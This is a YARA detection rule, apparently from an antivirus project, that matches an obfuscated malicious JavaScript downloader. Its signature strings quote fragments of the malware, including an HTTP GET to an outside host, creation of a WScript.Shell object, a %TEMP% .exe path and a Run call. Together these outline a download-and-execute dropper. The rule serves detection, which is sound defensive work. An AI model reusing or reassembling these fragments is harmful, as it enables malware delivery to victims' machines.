rule sig_20160330_897e8700c02bc69ba170ed785cfa42ce {
  meta:
    description = "datamaliciousorder - file 20160330_897e8700c02bc69ba170ed785cfa42ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b50e646edd6eadde12319392246ad33779ea597e380c48581bef7fa0336d352b"

  strings:
    $s1  = "_B[_Y](\"GET\", \"http://photronlamp.com/m39ska\", false);" fullword ascii
    $s2  = "var _HY = function _EX() {return WScript[_GJ](\"WScript\"+\".Shell\");}(), _PT = 11;" fullword ascii
    $s3  = "function _OL(_HB, _V){_YP = _YP * 1; return _HB - _V;};" fullword ascii
    $s4  = "if (_B[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _DA() {return _HY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tptcMDGV55CK.ex\" + \"e\";};" fullword ascii
    $s6  = "function _BR(){return _LC + \"\";};" fullword ascii
    $s7  = "function _M(_ME){_HY[\"Run\"](_ME, _YP, _YP);};" fullword ascii
    $s8  = "function _IU() {return ((_O == true) && (_O == _W)) ? 1 : _YP;};" fullword ascii
    $s9  = "function _R(){return 22;};" fullword ascii
    $s10 = "function _L()" fullword ascii
    $s11 = " while (_X){" fullword ascii
    $s12 = "return _OL(_CM, _EE);" fullword ascii
    $s13 = "var _SA = new this[\"Date\"]();" fullword ascii
    $s14 = "function _K(){return _GJ;};" fullword ascii
    $s15 = "function _GY(_RT) {var _N = (1, 2, 3, 4, 5, _RT); return _N;};" fullword ascii
    $s16 = "_W = true; " fullword ascii
    $s17 = "var _O = false;" fullword ascii
    $s18 = "_O = true; " fullword ascii
    $s19 = "var _SF = false;" fullword ascii
    $s20 = "} catch(_NK){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}